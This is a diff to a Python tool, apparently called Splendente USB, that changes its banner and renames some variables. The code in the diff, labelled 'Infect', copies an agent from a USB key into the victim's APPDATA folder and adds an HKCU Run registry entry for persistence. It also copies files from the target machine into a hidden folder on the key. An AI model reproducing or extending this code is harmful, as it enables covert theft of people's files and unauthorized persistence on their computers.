@@ -3,28 +3,17 @@
 """
 
 
-
-      *******               ***                                 **                                                      ***** *    **         *******         ***** **
-    *       ***              ***                                 **                              *                   ******  *  *****       *       ***    ******  ***
-   *         **               **                                 **                             **                  **   *  *     *****    *         **   **   *  * **
-   **        *                **                                 **                             **                 *    *  **     * **     **        *   *    *  *  **
-    ***             ****      **                                 **                           ********                 *  ***     *         ***              *  *   *
-   ** ***          * ***  *   **       ***    ***  ****      *** **      ***    ***  ****    ********     ***         **   **     *        ** ***           ** **  *
-    *** ***       *   ****    **      * ***    **** **** *  *********   * ***    **** **** *    **       * ***        **   **     *         *** ***         ** ** *
-      *** ***    **    **     **     *   ***    **   ****  **   ****   *   ***    **   ****     **      *   ***       **   **     *           *** ***       ** ***
-        *** ***  **    **     **    **    ***   **    **   **    **   **    ***   **    **      **     **    ***      **   **     *             *** ***     ** ** ***
-          ** *** **    **     **    ********    **    **   **    **   ********    **    **      **     ********       **   **     *               ** ***    ** **   ***
-           ** ** **    **     **    *******     **    **   **    **   *******     **    **      **     *******         **  **     *                ** **    *  **     **
-            * *  **    **     **    **          **    **   **    **   **          **    **      **     **               ** *      *                 * *        *      **
-  ***        *   *******      **    ****    *   **    **   **    **   ****    *   **    **      **     ****    *         ***      *       ***        *     ****     ***
- *  *********    ******       *** *  *******    ***   ***   *****      *******    ***   ***      **     *******           ********       *  *********     *  ********
-*     *****      **            ***    *****      ***   ***   ***        *****      ***   ***             *****              ****        *     *****      *     ****
-*                **                                                                                                                     *                *
- **              **                                                                                                                      **               **
-                  **
-
-
-
+ .d8888b.           888                        888                   888                   888     888  .d8888b.  888888b.   
+d88P  Y88b          888                        888                   888                   888     888 d88P  Y88b 888  "88b  
+Y88b.               888                        888                   888                   888     888 Y88b.      888  .88P  
+ "Y888b.   88888b.  888  .d88b.  88888b.   .d88888  .d88b.  88888b.  888888 .d88b.         888     888  "Y888b.   8888888K.  
+    "Y88b. 888 "88b 888 d8P  Y8b 888 "88b d88" 888 d8P  Y8b 888 "88b 888   d8P  Y8b        888     888     "Y88b. 888  "Y88b 
+      "888 888  888 888 88888888 888  888 888  888 88888888 888  888 888   88888888 888888 888     888       "888 888    888 
+Y88b  d88P 888 d88P 888 Y8b.     888  888 Y88b 888 Y8b.     888  888 Y88b. Y8b.            Y88b. .d88P Y88b  d88P 888   d88P 
+ "Y8888P"  88888P"  888  "Y8888  888  888  "Y88888  "Y8888  888  888  "Y888 "Y8888          "Y88888P"   "Y8888P"  8888888P"  
+           888                                                                                                               
+           888                                                                                                               
+           888                                                                                                                
 
 """
 
@@ -48,21 +37,21 @@ from splendentePersistence import Persistence
 
 #--------------------------------------------------------- [Global] ---------------------------------------------------------#
 
-searchUsbMountLetter = UsbMount.SearchUsbMountLetter()
-platform = sys.platform
+SEARCH_USB_MOUNT_LETTER = UsbMount.SearchUsbMountLetter()
+PLATFORM = sys.platform
 
 #---------------------------------------------------------- [Main] ----------------------------------------------------------#
 
 def main():
-    if platform == "win32":
+    if PLATFORM == "win32":
         # -- Check if your USB key (USB_DATA) is mounted -- #
-        if searchUsbMountLetter != None:
+        if SEARCH_USB_MOUNT_LETTER != None:
 
             # -- Check if log file is available on USB key -- #
-            if os.path.exists("{0}\\log\\splendente.log".format(searchUsbMountLetter)) == True:
+            if os.path.exists("{0}\\log\\splendente.log".format(SEARCH_USB_MOUNT_LETTER)) == True:
 
                 # -- Define log file -- #
-                logFile = "{0}\\log\\splendente.log".format(searchUsbMountLetter)
+                logFile = "{0}\\log\\splendente.log".format(SEARCH_USB_MOUNT_LETTER)
                 logging.basicConfig(
                                     filename=logFile,
                                     level=logging.DEBUG,
@@ -75,11 +64,11 @@ def main():
                     logging.info("Clear : Old {0} -> deleted".format(logFile))
 
                 # -- Check if conf file is available on USB key -- #
-                if os.path.exists(searchUsbMountLetter + "\\conf" + "\\splendente.ini") == True:
-                    confUsbDirectory = searchUsbMountLetter + "\\conf" + "\\splendente.ini"
+                if os.path.exists(SEARCH_USB_MOUNT_LETTER + "\\conf" + "\\splendente.ini") == True:
+                    confUsbDirectory = SEARCH_USB_MOUNT_LETTER + "\\conf" + "\\splendente.ini"
 
                     # --- Name of folder that will contain all data in USB key --- #
-                    dataUsbDirectory = "{0}\\data_{1}".format(searchUsbMountLetter, Date())
+                    dataUsbDirectory = "{0}\\data_{1}".format(SEARCH_USB_MOUNT_LETTER, Date())
                     os.makedirs(dataUsbDirectory)
 
                     # -- Check if data folder is available on USB key -- #    
@@ -98,10 +87,10 @@ def main():
                                 os.makedirs("{0}\\{1}".format(dataUsbDirectory, i))
 
                         # --- Check if agent directory is available on USB key --- #
-                        if os.path.exists("{0}\\agent".format(searchUsbMountLetter)) == True:
+                        if os.path.exists("{0}\\agent".format(SEARCH_USB_MOUNT_LETTER)) == True:
 
                             # --- Files copy from USB key --- #
-                            agentUsbDirectory = "{0}\\agent".format(searchUsbMountLetter)
+                            agentUsbDirectory = "{0}\\agent".format(SEARCH_USB_MOUNT_LETTER)
                             try:
                                 infectTarget = Persistence(agentUsbDirectory)
 
@@ -110,12 +99,12 @@ def main():
                                 else:
                                     logging.info("Infect : File upload from  {0} to {1} -> successful".format(agentUsbDirectory, os.environ["APPDATA"] + "\\Microsoft"))
                                     logging.info("Infect : Add Register {0}\\'program_copied' pointed to {1}\\'program_copied' from {2} -> successfull".format("HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", os.environ["APPDATA"] + "\\Microsoft", agentUsbDirectory))
-
+                            
                             except Exception as e:
                                 logging.error(e)
                                 pass
                         else:
-                            logging.info("No {0}\\agent directory".format(searchUsbMountLetter))
+                            logging.info("No {0}\\agent directory".format(SEARCH_USB_MOUNT_LETTER))
 
                         # -- Files copy from target -- #
                         for usbFolder in usbDirectories:
@@ -189,9 +178,9 @@ def main():
                         # -- Set the folder in hidden mode containing the copied files -- #
                         win32api.SetFileAttributes(dataUsbDirectory, win32con.FILE_ATTRIBUTE_HIDDEN)
                     else:
-                        logging.error("No {0}\\data directory".format(searchUsbMountLetter))
+                        logging.error("No {0}\\data directory".format(SEARCH_USB_MOUNT_LETTER))
                 else:
-                    logging.error("No {0}\\conf\\splendente.ini".format(searchUsbMountLetter))
+                    logging.error("No {0}\\conf\\splendente.ini".format(SEARCH_USB_MOUNT_LETTER))
                     sys.exit(0)
             else:
                 sys.exit(0)
